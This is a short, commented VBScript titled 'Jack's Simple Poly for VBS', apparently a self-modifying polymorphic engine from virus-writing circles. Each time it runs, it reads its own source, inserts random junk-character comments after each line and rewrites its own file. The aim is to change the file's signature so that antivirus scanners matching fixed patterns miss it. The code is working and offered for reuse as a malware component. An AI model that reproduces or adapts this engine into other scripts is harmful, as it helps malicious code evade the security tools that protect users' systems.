Rem Jack's Simple Poly for VBS | jspv

On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(WScript.ScriptFullName, 1)
AllCode = f.Readall

' Save the whole code into the variable 'AllCode'

For o = 1 To Len(AllCode)
If Mid(AllCode, o, 1) = vbCr Then x = x + 1
Next

' Check how many lines are in the code

Set f = fso.OpenTextFile(WScript.ScriptFullName, 1)
For i = 1 To (x + 1)

' Create a loop 1 to current lines

LineCode = f.Readline

' Readout line for line

For j = 1 To Int(Rnd * 30): JunkCode = JunkCode & Chr(255 - Int(Rnd * 200)): Next
PolyCode = PolyCode & LineCode & Chr(39) & JunkCode & vbCr
If Int(Rnd * 3) = 2 Then PolyCode = PolyCode & Chr(39) & JunkCode & vbCr

' Add the junk code

JunkCode = ""
If LineCode = "" Then Exit For
LineCode = ""
Next
Set f = fso.OpenTextFile(WScript.ScriptFullName, 2, True)
f.Writeline PolyCode

' Write new poly code into the script

